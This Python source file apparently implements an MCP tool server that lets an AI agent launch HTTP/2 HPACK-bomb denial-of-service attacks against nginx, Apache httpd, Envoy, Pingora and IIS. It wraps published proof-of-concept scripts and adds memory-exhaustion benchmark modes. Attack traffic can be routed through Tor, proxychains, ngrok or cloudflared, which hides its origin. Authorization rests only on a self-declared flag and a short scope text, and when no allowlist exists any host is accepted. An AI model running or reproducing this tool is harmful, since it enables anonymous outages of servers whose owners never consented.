#!/usr/bin/env python3
"""
HTTP/2 Bomb MCP — wraps califio/publications MADBugs/http2-bomb PoCs.

AUTHORIZED SECURITY TESTING ONLY. Requires explicit authorization confirmation
on every destructive run.
"""

from __future__ import annotations

import json
import os
import socket
import ssl
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Literal

from mcp.server.fastmcp import FastMCP

PLUGIN_ROOT = Path(__file__).resolve().parent
POC_ROOT = PLUGIN_ROOT / "vendor" / "califio-publications" / "MADBugs" / "http2-bomb"
BENCH_DIR = PLUGIN_ROOT / "benchmark"
BENCH_RUNNER = BENCH_DIR / "benchmark_runner.py"
BENCH_CSV = BENCH_DIR / "logs" / "benchmark_results.csv"
ALLOWLIST_PATH = PLUGIN_ROOT / "allowed_targets.json"
CONFIG_DIR = PLUGIN_ROOT / "config"
TUNNEL_CONFIG_PATH = CONFIG_DIR / "tunnel.json"

sys.path.insert(0, str(BENCH_DIR))
from tunnel import (  # noqa: E402
    TUNNEL_MODES,
    TunnelConfig,
    activate_tunnel,
    create_connection,
    load_tunnel_config,
    merge_tunnel_overrides,
    save_tunnel_config,
    test_tunnel_connectivity,
)
from tunnel_runner import run as tunnel_run  # noqa: E402

Variant = Literal["auto", "nginx", "httpd", "envoy", "pingora", "microsoft-iis"]
Profile = Literal["probe", "safe", "moderate", "aggressive"]

mcp = FastMCP(
    "http2-bomb",
    instructions=(
        "HTTP/2 HPACK-bomb DoS PoCs (califio/publications). Nur auf autorisierte Ziele. "
        "Zuerst probe_http2, dann run_http2_bomb_test mit authorization_confirmed=true "
        "und scope_description. Profile: probe/safe/moderate/aggressive. "
        "Tunnel: configure_http2_bomb_tunnel oder tunnel_mode/proxy_url auf Run-Tools. "
        "OOM-Benchmark: run_http2_bomb_benchmark, Logs: get_http2_bomb_benchmark_logs."
    ),
)


@dataclass(frozen=True)
class VariantMeta:
    id: str
    label: str
    script: Path
    amplification: str
    fixed_in: str | None
    platform: str
    kind: Literal["nginx", "cookie", "iis"]


VARIANTS: dict[str, VariantMeta] = {
    "nginx": VariantMeta(
        id="nginx",
        label="nginx (tiny a: header)",
        script=POC_ROOT / "nginx" / "hpack_bomb.py",
        amplification="~70:1",
        fixed_in="nginx 1.29.8 (max_headers)",
        platform="linux",
        kind="nginx",
    ),
    "httpd": VariantMeta(
        id="httpd",
        label="Apache httpd mod_http2 (cookie crumbs)",
        script=POC_ROOT / "httpd" / "hpack_httpd_cookie_bomb.py",
        amplification="~4,000:1",
        fixed_in="mod_http2 v2.0.41",
        platform="linux",
        kind="cookie",
    ),
    "envoy": VariantMeta(
        id="envoy",
        label="Envoy (fat cookie crumbs)",
        script=POC_ROOT / "envoy" / "hpack_cookie_bomb.py",
        amplification="~5,700:1",
        fixed_in=None,
        platform="linux",
        kind="cookie",
    ),
    "pingora": VariantMeta(
        id="pingora",
        label="Cloudflare Pingora (tiny a: header)",
        script=POC_ROOT / "pingora" / "attacker" / "hpack_bomb.py",
        amplification="~62:1",
        fixed_in=None,
        platform="linux",
        kind="nginx",
    ),
    "microsoft-iis": VariantMeta(
        id="microsoft-iis",
        label="Microsoft IIS (Windows Server 2025)",
        script=POC_ROOT / "microsoft-iis" / "poc" / "iis_hpack_dos.py",
        amplification="~68:1",
        fixed_in=None,
        platform="windows",
        kind="iis",
    ),
}

PROFILE_LIMITS: dict[Profile, dict[str, Any]] = {
    "probe": {
        "connections": 0,
        "streams": 0,
        "headers": 0,
        "refs": 0,
        "hold": 0,
        "max_runtime_sec": 15,
    },
    "safe": {
        "connections": 1,
        "streams": 1,
        "headers": 256,
        "refs": 256,
        "hold": 5,
        "drip_interval": 5,
        "max_runtime_sec": 60,
    },
    "moderate": {
        "connections": 1,
        "streams": 8,
        "headers": 4000,
        "refs": 4000,
        "hold": 30,
        "drip_interval": 10,
        "max_runtime_sec": 120,
    },
    "aggressive": {
        "connections": 15,
        "streams": 128,
        "headers": 32000,
        "refs": 8192,
        "hold": 120,
        "max_runtime_sec": 600,
    },
}


def _load_allowlist() -> list[dict[str, Any]]:
    if not ALLOWLIST_PATH.exists():
        return []
    try:
        data = json.loads(ALLOWLIST_PATH.read_text(encoding="utf-8"))
        return data if isinstance(data, list) else []
    except (json.JSONDecodeError, OSError):
        return []


def _host_allowed(host: str) -> tuple[bool, str]:
    entries = _load_allowlist()
    if not entries:
        return True, "Kein allowlist — nur authorization_confirmed erforderlich."
    host_l = host.strip().lower()
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        h = str(entry.get("host", "")).strip().lower()
        if h and (host_l == h or host_l.endswith("." + h)):
            return True, f"Ziel in allowlist: {h}"
    return (
        False,
        f"Host '{host}' nicht in {ALLOWLIST_PATH}. Eintrag hinzufügen oder Datei entfernen.",
    )


def _check_authorization(
    authorization_confirmed: bool,
    scope_description: str,
    host: str,
) -> str | None:
    if not authorization_confirmed:
        return (
            "authorization_confirmed muss true sein (schriftliche Erlaubnis für dieses Ziel)."
        )
    if len(scope_description.strip()) < 12:
        return "scope_description zu kurz (min. 12 Zeichen, z. B. Kunde/Ticket/Scope)."
    ok, msg = _host_allowed(host)
    if not ok:
        return msg
    return None


def _apply_tunnel(
    tunnel_mode: str | None = None,
    proxy_url: str | None = None,
    proxychains_conf: str | None = None,
    cloudflared_proxy: str | None = None,
    ngrok_addr: str | None = None,
    tunnel_config_path: str | None = None,
) -> TunnelConfig:
    base = load_tunnel_config(tunnel_config_path or TUNNEL_CONFIG_PATH)
    cfg = merge_tunnel_overrides(
        base,
        mode=tunnel_mode,
        proxy_url=proxy_url,
        proxychains_conf=proxychains_conf,
        cloudflared_proxy=cloudflared_proxy,
        ngrok_addr=ngrok_addr,
    )
    return activate_tunnel(cfg)


def _probe_http2(host: str, port: int, server_name: str | None, timeout: float = 8.0) -> dict[str, Any]:
    sni = server_name or host
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    raw = create_connection(host, port, timeout=timeout)
    try:
        sock = ctx.wrap_socket(raw, server_hostname=sni)
        alpn = sock.selected_alpn_protocol()
        cipher = sock.cipher()
        sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        sock.settimeout(2.0)
        try:
            peek = sock.recv(4096)
        except socket.timeout:
            peek = b""
        return {
            "reachable": True,
            "alpn": alpn,
            "h2_negotiated": alpn == "h2",
            "cipher": cipher[0] if cipher else None,
            "tls_version": cipher[1] if cipher else None,
            "server_hello_bytes": len(peek),
            "server_name": sni,
        }
    finally:
        try:
            sock.close()
        except Exception:
            pass
        try:
            raw.close()
        except Exception:
            pass


def _build_argv(
    variant: VariantMeta,
    host: str,
    port: int,
    profile: Profile,
    server_name: str | None,
    path: str | None,
    extra: dict[str, Any],
) -> list[str]:
    lim = PROFILE_LIMITS[profile].copy()
    lim.update({k: v for k, v in extra.items() if v is not None})

    py = sys.executable
    script = variant.script
    if not script.is_file():
        raise FileNotFoundError(f"PoC fehlt: {script}")

    if variant.kind == "iis":
        mode = "verify" if profile == "safe" else "attack"
        argv = [py, str(script), "--host", host, "--port", str(port), "--mode", mode]
        if mode == "attack":
            preset = str(lim.get("iis_preset", "8gb"))
            argv += ["--preset", preset]
            if lim.get("connections"):
                argv += ["-n", str(int(lim["connections"]))]
            if lim.get("hold"):
                argv += ["--hold", str(int(lim["hold"]))]
        return argv

    argv = [py, str(script), "--host", host, "--port", str(port)]

    if variant.kind == "nginx":
        argv += [
            "-n",
            str(int(lim["connections"])),
            "--streams",
            str(int(lim["streams"])),
            "--headers",
            str(int(lim["headers"])),
            "--hold",
            str(int(lim["hold"])),
            "--drip-interval",
            str(int(lim.get("drip_interval", 50))),
        ]
        if lim.get("verbose"):
            argv.append("-v")
        return argv

    # cookie-style: httpd, envoy
    sn = server_name or host
    argv += [
        "--server-name",
        sn,
        "--connections",
        str(int(lim["connections"])),
        "--streams",
        str(int(lim["streams"])),
        "--refs",
        str(int(lim["refs"])),
        "--hold",
        str(float(lim["hold"])),
    ]
    if path:
        argv += ["--path", path]
    if lim.get("drip_interval", 0) > 0:
        argv += ["--drip-interval", str(float(lim["drip_interval"]))]
    if variant.id == "envoy" and lim.get("cookie_value_size"):
        argv += ["--cookie-value-size", str(int(lim["cookie_value_size"]))]
    return argv


def _estimate(variant: VariantMeta, profile: Profile) -> str:
    lim = PROFILE_LIMITS[profile]
    if profile == "probe":
        return "Kein Memory-Impact — nur TLS/ALPN/H2-Preface-Check."

    if variant.kind == "nginx":
        h = int(lim["headers"])
        s = int(lim["streams"])
        c = int(lim["connections"])
        mem_bytes = c * s * h * 59 * 1.17
        wire_bytes = c * s * h
        mem_mb = mem_bytes / 1024 / 1024
        wire_mb = wire_bytes / 1024 / 1024
        amp = mem_bytes / max(wire_bytes, 1)
        mem_s = f"~{mem_mb:.2f} MB" if mem_mb < 1 else f"~{mem_mb:.0f} MB"
        wire_s = f"~{wire_mb * 1024:.0f} KB" if wire_mb < 0.05 else f"~{wire_mb:.1f} MB"
        return (
            f"Modell ({variant.id}): {mem_s} Server-RAM, "
            f"{wire_s} wire, ~{amp:.0f}:1 ({variant.amplification} publiziert)."
        )

    if variant.kind == "cookie":
        refs = int(lim["refs"])
        merge = refs * (refs + 1) + refs
        return (
            f"Modell ({variant.id}): cookie-merge ~{merge / 1024 / 1024:.1f} MiB/refs, "
            f"publiziert {variant.amplification}."
        )

    return f"IIS preset — siehe PoC README ({variant.amplification})."


def _benchmark_modes_for_variant(variant_id: str) -> str:
    try:
        sys.path.insert(0, str(BENCH_DIR))
        from variants import apex_modes_for_variant, get_variant

        spec = get_variant(variant_id)
        apex = ", ".join(apex_modes_for_variant(variant_id))
        base = "ramp, burst, cumulative, multiprocess, sustained, churn, optimized_oom, pipelined_sustain"
        if spec.kind == "nginx":
            return f"{base}, apex, apex_scaled, apex_mp | Apex: {apex}"
        if spec.kind == "cookie":
            return f"{base}, apex_cookie, apex_cookie_scaled, apex_cookie_mp | Apex: {apex}"
        return "apex_iis_mp (Windows orchestrator)"
    except Exception:
        return "see benchmark_runner.py --help"


@mcp.tool()
async def list_http2_bomb_variants() -> str:
    """Listet verfügbare Server-Varianten, Pfade, Amplification und Fix-Status."""
    lines = [
        "HTTP/2 Bomb — Varianten (califio/publications)",
        f"PoC-Root: {POC_ROOT}",
        "",
    ]
    seen: set[str] = set()
    for v in VARIANTS.values():
        if v.id in seen:
            continue
        seen.add(v.id)
        fixed = v.fixed_in or "offen / unbekannt"
        exists = "OK" if v.script.is_file() else "FEHLT"
        bench_modes = _benchmark_modes_for_variant(v.id)
        lines.append(
            f"- {v.id}: {v.label} | amp {v.amplification} | fix: {fixed} | "
            f"platform {v.platform} | script {exists} | kind {v.kind}"
        )
        lines.append(f"  benchmark modes: {bench_modes}")
    lines += [
        "",
        "Profile: probe | safe | moderate | aggressive",
        "Benchmark: run_http2_bomb_benchmark mit variant= + mode= (apex*, apex_cookie*, apex_iis_mp)",
        f"Allowlist (optional): {ALLOWLIST_PATH}",
    ]
    return "\n".join(lines)


@mcp.tool()
async def configure_http2_bomb_tunnel(
    mode: str = "none",
    proxy_url: str = "",
    proxy_host: str = "",
    proxy_port: int = 0,
    proxychains_conf: str = "",
    cloudflared_proxy: str = "",
    ngrok_addr: str = "",
    save: bool = True,
    test_host: str = "",
    test_port: int = 443,
) -> str:
    """
    Konfiguriert Tunnel-Routing für PoC/Benchmark (direct, socks5, http, tor, proxychains, ngrok, cloudflared).

    - mode: none | socks5 | http | tor | proxychains | ngrok | cloudflared
    - proxy_url: z. B. socks5://127.0.0.1:9050 oder http://user:pass@proxy:8080
    - save: Profil nach config/tunnel.json und ~/.config/http2-bomb/tunnel.json schreiben
    - test_host: optional Erreichbarkeitstest durch den Tunnel
    """
    if mode not in TUNNEL_MODES:
        return f"Unbekannter mode '{mode}'. Erlaubt: {', '.join(TUNNEL_MODES)}"

    overrides: dict[str, Any] = {"mode": mode}
    if proxy_url.strip():
        overrides["proxy_url"] = proxy_url.strip()
    if proxy_host.strip():
        overrides["proxy_host"] = proxy_host.strip()
    if proxy_port > 0:
        overrides["proxy_port"] = proxy_port
    if proxychains_conf.strip():
        overrides["proxychains_conf"] = proxychains_conf.strip()
    if cloudflared_proxy.strip():
        overrides["cloudflared_proxy"] = cloudflared_proxy.strip()
    if ngrok_addr.strip():
        overrides["ngrok_addr"] = ngrok_addr.strip()

    cfg = merge_tunnel_overrides(load_tunnel_config(), **overrides)
    activated = activate_tunnel(cfg)

    saved_paths: list[str] = []
    if save:
        for path in (TUNNEL_CONFIG_PATH, Path.home() / ".config" / "http2-bomb" / "tunnel.json"):
            try:
                save_tunnel_config(cfg, path)
                saved_paths.append(str(path))
            except OSError:
                pass

    lines = [
        "HTTP/2 Bomb — Tunnel konfiguriert",
        activated.summary(),
        f"PySocks: {'ja' if activated.effective_proxy_url() and mode != 'proxychains' else 'optional'}",
    ]
    if saved_paths:
        lines.append("Gespeichert: " + ", ".join(saved_paths))

    if test_host.strip():
        result = test_tunnel_connectivity(test_host.strip(), test_port)
        lines.append(f"Connectivity-Test: {json.dumps(result, indent=2)}")

    lines += [
        "",
        "Hinweise:",
        "- tor: SOCKS5 127.0.0.1:9050 (Tor daemon) oder proxychains ohne PySocks",
        "- cloudflared: cloudflared access tcp … dann cloudflared_proxy=socks5://127.0.0.1:PORT",
        "- ngrok: ngrok tcp 443 starten, ngrok_addr aus API oder manuell setzen",
        "- proxychains: proxychains4 -f /etc/proxychains.conf …",
    ]
    return "\n".join(lines)


@mcp.tool()
async def probe_http2(
    host: str,
    port: int = 443,
    server_name: str = "",
    tunnel_mode: str = "",
    proxy_url: str = "",
) -> str:
    """
    Prüft Erreichbarkeit, TLS und HTTP/2 (ALPN h2). Sendet keinen HPACK-Bomb — unbedenklich.
    Optional tunnel_mode/proxy_url für Routing über SOCKS/HTTP-Proxy.
    """
    if tunnel_mode.strip() or proxy_url.strip():
        _apply_tunnel(tunnel_mode=tunnel_mode or None, proxy_url=proxy_url or None)
    sni = server_name.strip() or host
    try:
        result = _probe_http2(host, port, sni)
    except OSError as exc:
        return f"PROBE FAILED: {host}:{port} — {exc}"
    return json.dumps(result, indent=2)


@mcp.tool()
async def estimate_http2_bomb_impact(
    variant: Variant = "nginx",
    profile: Profile = "moderate",
) -> str:
    """Schätzt Auswirkung für Variante/Profil ohne Angriff auszuführen."""
    if variant == "auto":
        variant = "nginx"
    if variant not in VARIANTS:
        return f"Unbekannte Variante: {variant}"
    return _estimate(VARIANTS[variant], profile)


@mcp.tool()
async def run_http2_bomb_test(
    host: str,
    port: int = 443,
    variant: Variant = "auto",
    profile: Profile = "safe",
    authorization_confirmed: bool = False,
    scope_description: str = "",
    server_name: str = "",
    path: str = "/",
    connections: int | None = None,
    streams: int | None = None,
    headers: int | None = None,
    refs: int | None = None,
    hold_seconds: int | None = None,
    iis_preset: str = "8gb",
    tunnel_mode: str = "",
    proxy_url: str = "",
    proxychains_conf: str = "",
) -> str:
    """
    Führt den HTTP/2 HPACK-Bomb-PoC aus (nur autorisierte Ziele).

    - authorization_confirmed: true nur mit dokumentierter Erlaubnis
    - scope_description: Ticket/Kunde/Scope (min. 12 Zeichen)
    - variant: nginx | httpd | envoy | pingora | microsoft-iis | auto (→ nginx)
    - profile: probe (nur H2-Check) | safe | moderate | aggressive
    """
    if variant == "auto":
        variant = "nginx"
    if variant not in VARIANTS:
        return f"Unbekannte Variante: {variant}. Nutze list_http2_bomb_variants."

    err = _check_authorization(authorization_confirmed, scope_description, host)
    if err:
        return f"ABGELEHNT: {err}"

    if tunnel_mode.strip() or proxy_url.strip() or proxychains_conf.strip():
        cfg = _apply_tunnel(
            tunnel_mode=tunnel_mode or None,
            proxy_url=proxy_url or None,
            proxychains_conf=proxychains_conf or None,
        )
    else:
        cfg = activate_tunnel(load_tunnel_config())

    meta = VARIANTS[variant]

    if profile == "probe":
        probe = _probe_http2(host, port, server_name.strip() or host)
        return (
            f"PROBE ONLY (profile=probe)\n"
            f"Scope: {scope_description.strip()}\n"
            f"{json.dumps(probe, indent=2)}"
        )

    if meta.platform == "windows" and sys.platform != "win32":
        return (
            f"IIS-PoC ({meta.script.name}) ist für Windows gedacht. "
            "Auf Linux nur probe_http2 oder Remote-Windows-Agent nutzen."
        )

    extra: dict[str, Any] = {}
    if connections is not None:
        extra["connections"] = connections
    if streams is not None:
        extra["streams"] = streams
    if headers is not None:
        extra["headers"] = headers
    if refs is not None:
        extra["refs"] = refs
    if hold_seconds is not None:
        extra["hold"] = hold_seconds
    if iis_preset:
        extra["iis_preset"] = iis_preset

    max_runtime = int(PROFILE_LIMITS[profile]["max_runtime_sec"])
    if os.environ.get("HTTP2_BOMB_MAX_RUNTIME"):
        max_runtime = min(max_runtime, int(os.environ["HTTP2_BOMB_MAX_RUNTIME"]))

    argv = _build_argv(
        meta,
        host,
        port,
        profile,
        server_name.strip() or None,
        path,
        extra,
    )

    estimate = _estimate(meta, profile)
    header = (
        f"HTTP/2 Bomb Test\n"
        f"Ziel: {host}:{port}\n"
        f"Variante: {meta.id} | Profil: {profile}\n"
        f"Scope: {scope_description.strip()}\n"
        f"Tunnel: {cfg.summary()}\n"
        f"Schätzung: {estimate}\n"
        f"Befehl: {' '.join(argv)}\n"
        f"Timeout: {max_runtime}s\n"
        "---\n"
    )

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    t0 = time.monotonic()
    try:
        proc = tunnel_run(
            argv,
            cwd=str(meta.script.parent),
            capture_output=True,
            text=True,
            timeout=max_runtime,
            env=env,
        )
    except subprocess.TimeoutExpired:
        return header + f"TIMEOUT nach {max_runtime}s (Prozess beendet)."
    except FileNotFoundError as exc:
        return header + f"FEHLER: {exc}"

    elapsed = time.monotonic() - t0
    out = (proc.stdout or "") + (proc.stderr or "")
    if len(out) > 120_000:
        out = out[:120_000] + "\n... [truncated]"
    status = "OK" if proc.returncode == 0 else f"EXIT {proc.returncode}"
    return f"{header}{status} in {elapsed:.1f}s\n{out}"


@mcp.tool()
async def get_http2_bomb_disclosure() -> str:
    """CVE/Fix-Status laut califio/publications README."""
    return """HTTP/2 Bomb — Disclosure (califio/publications)

- nginx: fixed in 1.29.8 — max_headers directive
  https://github.com/nginx/nginx/commit/365694160a85229a7cb006738de9260d49ff5fa2

- Apache httpd: fixed in mod_http2 v2.0.41 — cookie accounting vs LimitRequestFields
  https://github.com/apache/httpd/commit/47d3100b252dc6668a9e46ae885242be9eeca9cd

- Microsoft IIS, Envoy, Cloudflare Pingora: reported May 2026 — fix status unknown

Quelle: https://github.com/califio/publications/tree/main/MADBugs/http2-bomb

Nur auf eigene Systeme oder mit schriftlicher Kundenfreigabe testen."""


@mcp.tool()
async def run_http2_bomb_benchmark(
    host: str,
    port: int = 443,
    mode: str = "burst",
    connections: int = 50,
    variant: str = "nginx",
    iis_preset: str = "8gb",
    authorization_confirmed: bool = False,
    scope_description: str = "",
    tunnel_mode: str = "",
    proxy_url: str = "",
    proxychains_conf: str = "",
) -> str:
    """
    Startet OOM-Benchmark via benchmark_runner.py. Loggt jeden Run nach benchmark/logs/.

    variant: nginx | pingora | httpd | envoy | microsoft-iis
    mode: ramp | burst | apex | apex_scaled | apex_mp | apex_cookie* | apex_iis_mp | ...
    """
    err = _check_authorization(authorization_confirmed, scope_description, host)
    if err:
        return f"ABGELEHNT: {err}"

    if not BENCH_RUNNER.is_file():
        return f"Benchmark-Harness fehlt: {BENCH_RUNNER}"

    tunnel_cfg = _apply_tunnel(
        tunnel_mode=tunnel_mode or None,
        proxy_url=proxy_url or None,
        proxychains_conf=proxychains_conf or None,
    )

    valid_modes = {
        "ramp", "burst", "cumulative", "multiprocess", "sustained",
        "optimized_oom", "churn", "apex", "apex_scaled", "apex_mp",
        "apex_cookie", "apex_cookie_scaled", "apex_cookie_mp", "apex_iis_mp",
        "pipelined_sustain", "full_campaign",
    }
    if mode not in valid_modes:
        return f"Unbekannter mode '{mode}'. Erlaubt: {', '.join(sorted(valid_modes))}"

    if mode == "apex_iis_mp" and sys.platform != "win32":
        sys.path.insert(0, str(BENCH_DIR))
        try:
            from iis_apex_runner import build_powershell_command
            from attack_config import profile_apex_iis_mp

            preset = profile_apex_iis_mp(iis_preset)
            cmd = build_powershell_command(host, port, preset, scope_description)
            return (
                f"IIS apex_iis_mp erfordert Windows für die Ausführung.\n"
                f"Scope: {scope_description.strip()}\n\n"
                f"PowerShell auf Windows Server:\n{cmd}"
            )
        except Exception as exc:
            return f"IIS apex_iis_mp: {exc}"

    argv = [
        sys.executable,
        str(BENCH_RUNNER),
        "--host",
        host,
        "--port",
        str(port),
        "--variant",
        variant,
        "--mode",
        mode,
        "--connections",
        str(connections),
    ]
    if tunnel_cfg.mode != "none":
        argv += ["--tunnel-mode", tunnel_cfg.mode]
        if tunnel_cfg.proxy_url:
            argv += ["--proxy-url", tunnel_cfg.proxy_url]
        if tunnel_cfg.proxychains_conf:
            argv += ["--proxychains-conf", tunnel_cfg.proxychains_conf]
    if mode == "apex_iis_mp":
        argv += ["--iis-preset", iis_preset]

    timeout = 7200 if mode == "full_campaign" else 3600
    header = (
        f"HTTP/2 Bomb Benchmark\n"
        f"Ziel: {host}:{port}\n"
        f"Variant: {variant} | Mode: {mode} | Connections: {connections}\n"
        f"Tunnel: {tunnel_cfg.summary()}\n"
        f"Scope: {scope_description.strip()}\n"
        f"Logs: {BENCH_CSV}\n"
        f"Befehl: {' '.join(argv)}\n"
        f"Timeout: {timeout}s\n---\n"
    )

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    t0 = time.monotonic()
    try:
        proc = tunnel_run(
            argv,
            cwd=str(BENCH_DIR),
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env,
        )
    except subprocess.TimeoutExpired:
        return header + f"TIMEOUT nach {timeout}s — Teil-Logs in {BENCH_CSV}"

    elapsed = time.monotonic() - t0
    out = (proc.stdout or "") + (proc.stderr or "")
    if len(out) > 80_000:
        out = out[-80_000:] + "\n... [truncated tail]"
    status = "OK" if proc.returncode == 0 else f"EXIT {proc.returncode}"
    return f"{header}{status} in {elapsed:.0f}s\n{out}"


@mcp.tool()
async def get_http2_bomb_benchmark_logs(last_n: int = 10) -> str:
    """Liest die letzten N Benchmark-Runs aus benchmark_results.csv."""
    if not BENCH_CSV.is_file():
        return f"Keine Logs — CSV fehlt: {BENCH_CSV}"

    lines = BENCH_CSV.read_text(encoding="utf-8").strip().splitlines()
    if len(lines) <= 1:
        return "CSV vorhanden, aber noch keine Runs."

    header = lines[0]
    rows = lines[1:]
    tail = rows[-max(1, min(last_n, 50)) :]
    return header + "\n" + "\n".join(tail) + f"\n\n---\nGesamt: {len(rows)} Runs | Pfad: {BENCH_CSV}"


def main() -> None:
    mcp.run()


if __name__ == "__main__":
    main()
